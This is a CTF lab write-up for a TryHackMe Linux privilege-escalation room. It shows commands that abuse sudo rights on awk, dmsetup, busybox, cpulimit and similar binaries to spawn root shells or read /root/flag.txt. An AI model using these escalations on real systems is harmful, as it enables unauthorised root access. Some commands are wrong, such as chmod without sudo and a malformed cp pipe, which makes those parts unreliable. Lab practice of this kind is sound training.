writeups for the linux priv esc playground pre release(notes):

### tryhackme linux priv esc playground - 80 SUID binaries(80 different priv esc methods):

In this category some will be in more depth and some will be in less detail depending on how much there is to explain.

* note that there will be more added every now and then, all 80 methods wont be available from release.
As always we will `sudo -l` to see what we can run as sudo. In this case there is 80 different ways of priv esc to root.
```bash
-bash-4.2$ sudo -l
Matching 'Defaults' entries for user on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User user may run the following commands on this host:
    (root) NOPASSWD: /bin/apt-get*, (root) /bin/apt*, (root) /usr/bin/aria2c, (root) /usr/sbin/arp, (root) /bin/ash, (root) /usr/bin/awk, (root) /usr/bin/base64, (root) /bin/bash, (root) /bin/busybox, (root) /bin/cat, (root)
    /bin/chmod, (root) /bin/chown, (root) /bin/cp, (root) /usr/bin/cpan, (root) /usr/bin/cpulimit, (root) /bin/crontab, (root) /bin/csh, (root) /bin/curl, (root) /usr/bin/cut, (root) /bin/dash, (root) /bin/date, (root) /bin/dd, (root)
    /usr/bin/diff, (root) /bin/dmesg, (root) /sbin/dmsetup, (root) /usr/bin/docker, (root) /usr/bin/dpkg, (root) /usr/bin/easy_install, (root) /usr/bin/emacs, (root) /usr/bin/env, (root) /usr/bin/expand, (root) /usr/bin/expect, (root)
    /usr/bin/facter, (root) /usr/bin/file, (root) /usr/bin/find, (root) /usr/bin/flock, (root) /usr/bin/fmt, (root) /usr/bin/fold, (root) /usr/bin/ftp, (root) /usr/bin/gawk, (root) /usr/bin/gdb, (root) /usr/bin/gimp, (root)            
    /usr/bin/git, (root) /bin/grep, (root) /usr/bin/head, (root) /usr/sbin/iftop, (root) /usr/bin/ionice, (root) /sbin/ip, (root) /usr/bin/irb, (root) /usr/bin/jq, (root) /usr/bin/ksh, (root) /sbin/ldconfig, (root) /usr/bin/less,      
    (root) /sbin/logsave, (root) /usr/bin/ltrace, (root) /usr/bin/lua, (root) /usr/bin/make, (root) /usr/bin/man, (root) /usr/bin/mawk, (root) /bin/more, (root) /bin/mount, (root) /usr/bin/mtr, (root) /bin/mv, (root) /usr/bin/nano,    
    (root) /usr/bin/nawk, (root) /bin/nc, (root) /usr/bin/nice, (root) /usr/bin/nl, (root) /usr/bin/nmap, (root) /usr/sbin/node, (root) /usr/bin/od, (root) /usr/bin/openssl, (root) /usr/bin/perl, (root) /usr/bin/pg, (root)             
    /usr/bin/php, (root) /usr/bin/pic, (root) /usr/bin/pico, (root) /usr/bin/pip, (root) /usr/bin/puppet, (root) /usr/bin/python, (root) /usr/bin/readelf, (root) /usr/bin/redm, (root) /usr/bin/rlwrap, (root) /usr/bin/rsync, (root)     
    /usr/bin/ruby, (root) /usr/bin/run-mailcaps, (root) /bin/run-parts, (root) /usr/bin/rvim, (root) /usr/bin/scp, (root) /usr/bin/screen, (root) /usr/bin/script, (root) /bin/sed, (root) /usr/sbin/service, (root) /usr/bin/setarch,     
    (root) /usr/bin/sftp, (root) /usr/bin/smbclient, (root) /usr/bin/socat, (root) /usr/bin/sort, (root) /usr/bin/sqlite3, (root) /usr/bin/ssh, (root) /sbin/start-stop-daemon, (root) /usr/bin/stdbuf, (root) /usr/bin/strace, (root)     
    /usr/bin/tail, (root) /bin/tar, (root) /usr/bin/taskset, (root) /usr/bin/tclsh, (root) /usr/sbin/tcpdump, (root) /usr/bin/tee, (root) /usr/bin/telnet, (root) /usr/bin/tftp, (root) /usr/bin/time, (root) /usr/bin/timeout, (root)     
    /usr/bin/tmux, (root) /usr/bin/ul, (root) /usr/bin/unexpand, (root) /usr/bin/uniq, (root) /usr/bin/unshare, (root) /usr/bin/vi, (root) /usr/bin/vim, (root) /usr/bin/watch, (root) /usr/bin/wget, (root) /usr/bin/xargs, (root)        
    /usr/bin/xxd, (root) /usr/bin/zip, (root) /usr/bin/zsh
```

#### base64

```bash-4.2$ sudo base64 /root/flag.txt
Q29uZ3JhdHVsYXRpb25zISBZb3UgZ290IHRoZSBlYXNpZXN0IGZsYWcgb24gVEhNIQoKVEhNezNh
c3lfZjE0Z18xbTQwfQoKTm93IGdvIHByaXYgZXNjIHNvbWUgbW9yZSEK
```
First we convert the root flag to base64 using sudo then add it to a file and then decode from base64 giving us the flag.

#### arp

arp is used to do privileged file reads so we can try reading a file as sudo with arp and get our flag
```bash
sudo arp -v -f "/root/flag.txt"
```  
#### ash

ash was a really easy one just required knowledge of what it acctually did in order to execute it right.
Essentially ash is an suid that breaks out of restricted environments by spawning a shell, in our case the restricted environment is the user ssh session. We simply just run the program to get a shell.
```bash
bash-4.2$ sudo ash
# whoami
root
```

#### /bin/bash

this was was very obvious and summarises the very foundation of priv esc being spawning a shell e.g `/bin/bash`
```bash
sudo /bin/bash
root@privesc:/root#
```
#### busybox

Essentially busybox is an suid that breaks out of restricted environments by spawning a shell, in our case the restricted environment is the user ssh session. We simply just run the program with the parameter `sh` to break out of our shell. or likewise we can use it for a file read to in this example we read the flag with it.

```bash
bash-4.2$ sudo busybox cat "/root/flag.txt"
THM{3asy_f14g_1m40}
```

#### cat
For this one it should be obvious and needs 0 explanation we just do `sudo cat /root/flag.txt`

#### awk

Awk can also break out of shells but can work with reverse shells and many more, in our command we simply spawn a shell with `system`
```bash
-bash-4.2$ sudo awk 'BEGIN {system("/bin/sh")}'
# whoami                                                                                                                                    root
```

#### chmod

we change the permissions for the flag with chmod so that we can read it.
```bash
bash-4.2$ chmod 777 /root/flag.txt
bash-4.2$ cat /root/flag.txt
```

#### chown
With chown we can change the permissions of a file and in particular we want our flag file:
```bash
sudo chown $(id -un):$(id -gn) /root/flag.txt
```
From here we can read the flag normally

#### cp

```bash
sudo cp /root/flag.txt . | cat flag.txt
```

#### cpan

Cpan is a script that allows us to run perl commands with `! command`.
we run `sudo cpan` and then when the poppup comes up we type `! exec '/bin/bash'`.

#### cpulimit

we just run this to get a shell.
```bash
sudo cpulimit -l 100 -f /bin/sh
```

#### csh
used to break out of restricted shells:
```bash
bash-4.2$ sudo csh
# whoami
root
```

#### dash

used to break out of restricted shells.
```bash
-bash-4.2$ sudo dash
# whoami
root
```

#### date
By using date against a file is assumes that the file we give involves a time(number) but when we give it the file with the flag in it in theory it should give an error message. When we run it we get an error message with the flag along with it claiming that the flag is invalid.
```bash
-bash-4.2$ sudo date -f /root/flag.txt
date: invalid date `Congratulations! You got the easiest flag on THM!'
Sun Jul  5 00:00:00 BST 2020
date: invalid date `THM{3asy_f14g_1m40}'
Sun Jul  5 00:00:00 BST 2020
date: invalid date `Now go priv esc some more!
```

#### dd

```bash
-bash-4.2$ sudo dd if=/root/flag.txt
THM{3asy_f14g_1m40}
```

#### diff
diff reads files outside of a restricted system meaning that we can read the flag from outside our user own.

```bash
-bash-4.2$ sudo diff --line-format=%L /dev/null /root/flag.txt
THM{3asy_f14g_1m40}
```
#### dmsetup

```bash
-bash-4.2$ sudo dmsetup ls --exec '/bin/sh -s'
# whoami
root
```




checklist of all the ones that ive done with a ++ next to the command:

(root) NOPASSWD: /bin/apt-get*, (root) /bin/apt*, (root) /usr/bin/aria2c, (root) /usr/sbin/arp++, (root) /bin/ash++  (root) /usr/bin/awk++, (root) /usr/bin/base64++, (root) /bin/bash++, (root) /bin/busybox++, (root) /bin/cat++, (root)
/bin/chmod++, (root) /bin/chown++, (root) /bin/cp++, (root) /usr/bin/cpan++, (root) /usr/bin/cpulimit++, (root) /bin/crontab, (root) /bin/csh++, (root) /bin/curl, (root) /usr/bin/cut, (root) /bin/dash++, (root) /bin/date++, (root) /bin/dd++, (root)
/usr/bin/diff++, (root) /bin/dmesg, (root) /sbin/dmsetup++, (root) /usr/bin/docker, (root) /usr/bin/dpkg, (root) /usr/bin/easy_install, (root) /usr/bin/emacs, (root) /usr/bin/env, (root) /usr/bin/expand, (root) /usr/bin/expect, (root)
/usr/bin/facter, (root) /usr/bin/file, (root) /usr/bin/find, (root) /usr/bin/flock, (root) /usr/bin/fmt, (root) /usr/bin/fold, (root) /usr/bin/ftp, (root) /usr/bin/gawk, (root) /usr/bin/gdb, (root) /usr/bin/gimp, (root)            
/usr/bin/git, (root) /bin/grep, (root) /usr/bin/head, (root) /usr/sbin/iftop, (root) /usr/bin/ionice, (root) /sbin/ip, (root) /usr/bin/irb, (root) /usr/bin/jq, (root) /usr/bin/ksh, (root) /sbin/ldconfig, (root) /usr/bin/less,      
(root) /sbin/logsave, (root) /usr/bin/ltrace, (root) /usr/bin/lua, (root) /usr/bin/make, (root) /usr/bin/man, (root) /usr/bin/mawk, (root) /bin/more, (root) /bin/mount, (root) /usr/bin/mtr, (root) /bin/mv, (root) /usr/bin/nano,    
(root) /usr/bin/nawk, (root) /bin/nc, (root) /usr/bin/nice, (root) /usr/bin/nl, (root) /usr/bin/nmap, (root) /usr/sbin/node, (root) /usr/bin/od, (root) /usr/bin/openssl, (root) /usr/bin/perl, (root) /usr/bin/pg, (root)             
/usr/bin/php, (root) /usr/bin/pic, (root) /usr/bin/pico, (root) /usr/bin/pip, (root) /usr/bin/puppet, (root) /usr/bin/python, (root) /usr/bin/readelf, (root) /usr/bin/redm, (root) /usr/bin/rlwrap, (root) /usr/bin/rsync, (root)     
/usr/bin/ruby, (root) /usr/bin/run-mailcaps, (root) /bin/run-parts, (root) /usr/bin/rvim, (root) /usr/bin/scp, (root) /usr/bin/screen, (root) /usr/bin/script, (root) /bin/sed, (root) /usr/sbin/service, (root) /usr/bin/setarch,     
(root) /usr/bin/sftp, (root) /usr/bin/smbclient, (root) /usr/bin/socat, (root) /usr/bin/sort, (root) /usr/bin/sqlite3, (root) /usr/bin/ssh, (root) /sbin/start-stop-daemon, (root) /usr/bin/stdbuf, (root) /usr/bin/strace, (root)     
/usr/bin/tail, (root) /bin/tar, (root) /usr/bin/taskset, (root) /usr/bin/tclsh, (root) /usr/sbin/tcpdump, (root) /usr/bin/tee, (root) /usr/bin/telnet, (root) /usr/bin/tftp, (root) /usr/bin/time, (root) /usr/bin/timeout, (root)     
/usr/bin/tmux, (root) /usr/bin/ul, (root) /usr/bin/unexpand, (root) /usr/bin/uniq, (root) /usr/bin/unshare, (root) /usr/bin/vi, (root) /usr/bin/vim, (root) /usr/bin/watch, (root) /usr/bin/wget, (root) /usr/bin/xargs, (root)        
/usr/bin/xxd, (root) /usr/bin/zip, (root) /usr/bin/zsh
